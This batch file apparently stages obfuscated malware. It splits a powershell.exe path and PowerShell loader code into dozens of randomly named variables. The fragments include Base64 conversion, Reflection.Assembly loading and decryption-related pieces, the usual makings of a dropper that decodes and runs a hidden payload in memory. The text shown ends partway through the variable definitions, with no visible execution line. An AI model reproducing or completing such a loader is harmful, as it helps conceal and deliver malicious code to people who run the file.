@echo off
set "VrBDUnHrkl=ll"
set "BEijdTalRh=\v"
set "xklSNryoid=Po"
set "BawqwWzJSO=we"
set "EevyERJntN=ws"
set "PqRdvKgGrZ=po"
set "AIJpijRapc=s\"
set "RXwfQxWCcY=rs"
set "HxTOSAvTkD= /"
set "NEEtPdWQXL=xe"
set "oYhdtfguxw=em"
set "NPKFGTpqZY=nd"
set "PxmKsoVTDT=Wi"
set "XwpTKFHVjF=\W"
set "cGVIRPQZBe=ll"
set "JLRMOYDkip=in"
set "bfglPcXTCv=1."
set "KEkZbFpsiW=rS"
set "sikxFLIwcY=py"
set "MxfkPAUdLj=do"
set "FZJtuRTLmY=.e"
set "QFrQtlPJlA=y "
set "ndHGheIBil=0\"
set "HmXgCQZWLz=ow"
set "kydFsLocPe=he"
set "WKnBvSSDHR=Sy"
set "HeKHrSERvj= C"
set "cpbWbWYwLJ=32"
set "PVaNfDAgiC=st"
set "ICjnLflaMN=:\"
set "YaXqRletpk=co"
set "opQuSBmnxx=he"
set "sOnvXAqeej=we"
set "lWFzAcyZfi=cd"
set "VgxiVtAOxt= %~dp0"
set "WRWTeLpXLp=GFsN"
set "ZBWaXWNezZ=[]] "
set "rDJNjhbQAG=;$ZU"
set "VVywFymAZh=$fir"
set "PpqWpMQODc=Q) {"
set "ENyHtrFfmx=pher"
set "JvhwcmeQUF=NgL."
set "ypHQpZmnQl=F.En"
set "RSIqTBlFpS= '')"
set "OtjFqSAaVh=vert"
set "HNySEFsZwi=YxVw"
set "tcQdqitcEf=V = "
set "JcGjjaIWhZ=.Ass"
set "zzmTiOibhB=Comp"
set "gqFGgdhljl=MEo."
set "jBGLLaIzQY=).Sp"
set "fRmPZrVHeH=eQ ="
set "FpLnJsbPQW= = ["
set "lclYrqMEBm=CFxo"
set "ZRKXaFJpBL=s75K"
set "CkFeNLxRKM=y.Pa"
set "LwYpOqwppf=ach "
set "fgrlUfRPAZ=rt]:"
set "iPiIdekGri=ect "
set "lkpBsGfZRy=lit("
set "ANuHXlTBgP=; };"
set "pRGTTKyaXN=em.I"
set "tZCwfGlrOE=::('"
set "uhuYFBoFjO=ne);"
set "LJJyZpMNay=flec"
set "YwVIivnIus=d;$y"
set "ZUVjTKJBIA=l5E7"
